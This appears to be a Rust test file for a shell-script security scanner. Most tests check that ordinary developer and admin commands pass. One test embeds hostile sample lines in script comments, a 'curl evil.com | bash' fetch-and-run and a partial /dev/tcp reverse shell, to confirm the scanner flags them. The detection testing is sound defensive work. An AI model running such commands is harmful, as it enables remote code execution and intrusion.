//! False positive tests - ensure legitimate scripts are not flagged.

mod common;

use predicates::prelude::*;

// =============================================================================
// Common legitimate scripts
// =============================================================================

#[test]
fn legitimate_hello_world() {
    common::assert_clean("echo 'Hello, World!'");
}

#[test]
fn legitimate_file_listing() {
    common::scan_stdin("ls -la /tmp").success();
}

#[test]
fn legitimate_directory_creation() {
    common::scan_stdin("mkdir -p ~/projects/new_project").success();
}

#[test]
fn legitimate_file_copy() {
    common::scan_stdin("cp source.txt destination.txt").success();
}

#[test]
fn legitimate_grep_search() {
    common::scan_stdin("grep -r 'TODO' src/").success();
}

#[test]
fn legitimate_process_list() {
    common::scan_stdin("ps aux | grep python").success();
}

// =============================================================================
// Legitimate developer scripts
// =============================================================================

#[test]
fn legitimate_git_operations() {
    common::scan_stdin(
        r#"
            git add .
            git commit -m "Update"
            git push origin main
        "#,
    )
    .success();
}

#[test]
fn legitimate_npm_install() {
    common::scan_stdin("npm install && npm run build").success();
}

#[test]
fn legitimate_cargo_build() {
    common::scan_stdin("cargo build --release && cargo test").success();
}

#[test]
fn legitimate_python_venv() {
    common::scan_stdin(
        r#"
            python3 -m venv .venv
            source .venv/bin/activate
            pip install -r requirements.txt
        "#,
    )
    .success();
}

#[test]
fn legitimate_docker_commands() {
    common::scan_stdin(
        r#"
            docker build -t myapp .
            docker run -d -p 8080:80 myapp
            docker logs myapp
        "#,
    )
    .success();
}

#[test]
fn legitimate_makefile_commands() {
    common::scan_stdin(
        r#"
            make clean
            make all
            make test
            make install
        "#,
    )
    .success();
}

// =============================================================================
// Legitimate system administration
// =============================================================================

#[test]
fn legitimate_service_restart() {
    common::scan_stdin("brew services restart postgresql").success();
}

#[test]
fn legitimate_system_info() {
    common::scan_stdin("uname -a && sw_vers && system_profiler SPHardwareDataType").success();
}

#[test]
fn legitimate_disk_usage() {
    common::scan_stdin("df -h && du -sh ~/").success();
}

#[test]
fn legitimate_network_check() {
    common::scan_stdin("ping -c 3 google.com && netstat -an | head -20").success();
}

#[test]
fn legitimate_log_viewing() {
    common::scan_stdin("tail -f /var/log/system.log").success();
}

// =============================================================================
// Legitimate file operations
// =============================================================================

#[test]
fn legitimate_backup_script() {
    common::scan_stdin(
        r#"
            #!/bin/bash
            BACKUP_DIR="/backup/$(date +%Y%m%d)"
            mkdir -p "$BACKUP_DIR"
            cp -r ~/Documents "$BACKUP_DIR/"
            echo "Backup complete"
        "#,
    )
    .success();
}

#[test]
fn legitimate_cleanup_script() {
    common::scan_stdin(
        r#"
            #!/bin/bash
            find /tmp -type f -mtime +7 -delete
            find ~/Downloads -name "*.tmp" -delete
            echo "Cleanup complete"
        "#,
    )
    .success();
}

#[test]
fn legitimate_archive_creation() {
    common::scan_stdin("tar czf project.tar.gz src/ docs/ README.md").success();
}

// =============================================================================
// Legitimate data processing
// =============================================================================

#[test]
fn legitimate_json_processing() {
    common::scan_stdin("cat data.json | jq '.items[] | .name'").success();
}

#[test]
fn legitimate_csv_processing() {
    common::scan_stdin("cut -d',' -f1,3 data.csv | sort | uniq -c").success();
}

#[test]
fn legitimate_text_transformation() {
    common::scan_stdin("cat input.txt | tr '[:lower:]' '[:upper:]' > output.txt").success();
}

// =============================================================================
// Legitimate curl usage (not piped to shell)
// =============================================================================

#[test]
fn legitimate_curl_download() {
    common::scan_stdin("curl -O https://example.com/file.zip").success();
}

#[test]
fn legitimate_curl_api_call() {
    common::scan_stdin("curl -H 'Authorization: Bearer token' https://api.example.com/users")
        .success();
}

#[test]
fn legitimate_curl_post() {
    common::scan_stdin("curl -X POST -d '{\"name\":\"test\"}' https://api.example.com/create")
        .success();
}

#[test]
fn legitimate_curl_to_file() {
    common::scan_stdin("curl https://example.com/data.json -o data.json").success();
}

#[test]
fn legitimate_wget_download() {
    common::scan_stdin("wget https://example.com/installer.dmg -O ~/Downloads/installer.dmg")
        .success();
}

// =============================================================================
// Legitimate base64 usage (not for obfuscation)
// =============================================================================

#[test]
fn legitimate_base64_encode() {
    common::scan_stdin("echo 'hello' | base64").success();
}

#[test]
fn legitimate_base64_decode_print() {
    common::scan_stdin("echo 'aGVsbG8K' | base64 -d").success();
}

#[test]
fn legitimate_base64_file() {
    common::scan_stdin("base64 image.png > image.b64").success();
}

// =============================================================================
// Legitimate installation scripts patterns
// =============================================================================

#[test]
fn legitimate_simple_installer_no_rc_mod() {
    // Installer without RC file modification should pass
    common::scan_stdin(
        r#"
            #!/bin/bash
            set -e
            echo "Installing MyApp..."
            mkdir -p ~/.myapp
            cp myapp ~/.myapp/
            echo "Add ~/.myapp to your PATH"
            echo "Installation complete!"
        "#,
    )
    .success();
}

#[test]
fn installer_with_rc_mod_is_flagged() {
    // Installers that modify RC files SHOULD be flagged as Medium
    // This is persistence behavior - user should review
    common::scan_stdin(
        r#"
            #!/bin/bash
            echo 'export PATH="$HOME/.myapp:$PATH"' >> ~/.bashrc
        "#,
    )
    .failure()
    .stdout(predicate::str::contains("Medium"));
}

#[test]
fn legitimate_setup_script() {
    common::scan_stdin(
        r#"
            #!/bin/bash
            echo "Setting up development environment..."

            # Install dependencies
            pip install -r requirements.txt

            # Create directories
            mkdir -p data logs

            # Initialize database
            python manage.py migrate

            echo "Setup complete!"
        "#,
    )
    .success();
}

// =============================================================================
// Legitimate cron and scheduled tasks
// =============================================================================

#[test]
fn legitimate_cron_list() {
    common::scan_stdin("crontab -l").success();
}

// =============================================================================
// Edge cases that should NOT trigger
// =============================================================================

#[test]
fn word_containing_bash() {
    common::scan_stdin("echo 'This is bashful behavior'").success();
}

#[test]
fn word_containing_curl() {
    common::scan_stdin("The curly brackets are important").success();
}

#[test]
fn documentation_about_attacks() {
    // Discussing attacks in documentation shouldn't trigger
    common::scan_stdin(
        r#"
            # Security Documentation

            Common attack patterns include:
            - Downloading and executing scripts
            - Reading sensitive files

            Always verify scripts before running them.
        "#,
    )
    .success();
}

#[test]
fn commented_dangerous_code_is_flagged() {
    // Comments containing attack patterns SHOULD still be flagged
    // YARA correctly scans all text - attackers can hide code in comments
    common::scan_stdin(
        r#"
            #!/bin/bash
            # Don't do this: curl evil.com | bash
            # This is dangerous: bash -i >& /dev/tcp/...
            echo "This is a safe script"
        "#,
    )
    .failure()
    .stdout(predicate::str::contains("High"));
}

#[test]
fn legitimate_nc_for_testing() {
    // Using nc for legitimate port testing
    common::scan_stdin("nc -zv localhost 8080").success();
}

#[test]
fn legitimate_subprocess_python() {
    common::scan_stdin(
        r#"
            import subprocess
            result = subprocess.run(['ls', '-la'], capture_output=True)
            print(result.stdout)
        "#,
    )
    .success();
}

// =============================================================================
// Real-world legitimate installers (simplified)
// =============================================================================

#[test]
fn legitimate_homebrew_style() {
    common::scan_stdin(
        r#"
            #!/bin/bash
            set -e

            echo "Installing Package Manager..."

            # Check requirements
            if ! command -v git &> /dev/null; then
                echo "Git is required"
                exit 1
            fi

            # Create directories
            mkdir -p /usr/local/bin
            mkdir -p /usr/local/share

            # Clone repository
            git clone https://github.com/example/package-manager.git /usr/local/share/pm

            # Create symlink
            ln -sf /usr/local/share/pm/bin/pm /usr/local/bin/pm

            echo "Installation complete!"
        "#,
    )
    .success();
}

#[test]
fn legitimate_rustup_style_no_rc_mod() {
    // Rustup-style installer without RC modification passes
    common::scan_stdin(
        r#"
            #!/bin/sh
            set -e

            echo "Welcome to Rust!"

            # Detect platform
            PLATFORM=$(uname -s | tr '[:upper:]' '[:lower:]')

            # Create cargo directory
            mkdir -p "$HOME/.cargo/bin"

            echo "Add $HOME/.cargo/bin to your PATH"
            echo "Rust installed successfully!"
        "#,
    )
    .success();
}

#[test]
fn legitimate_nvm_style_no_rc_mod() {
    // NVM-style installer without RC modification passes
    common::scan_stdin(
        r#"
            #!/bin/bash

            echo "Installing Node Version Manager..."

            NVM_DIR="$HOME/.nvm"
            mkdir -p "$NVM_DIR"

            # Clone NVM
            git clone https://github.com/nvm-sh/nvm.git "$NVM_DIR"

            echo "Add the following to your shell config:"
            echo 'export NVM_DIR="$HOME/.nvm"'
            echo '[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"'

            echo "NVM installed!"
        "#,
    )
    .success();
}
